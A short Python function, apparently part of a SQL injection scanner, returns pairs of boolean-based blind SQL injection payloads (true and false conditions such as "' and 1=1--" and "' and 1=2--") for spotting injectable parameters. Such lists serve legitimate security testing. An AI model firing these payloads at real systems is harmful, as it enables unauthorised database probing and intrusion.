def payload_blind():
    blind={
        "' and 1=1--":"' and 1=2--",
        '" and 1=1--':'" and 1=2--',
        "' and true--":"' and false--",
        '" and true--':'" and false--',
        " and true--":" and false--",
        " and 1=1--":" and 1=2--"
    }
    return blind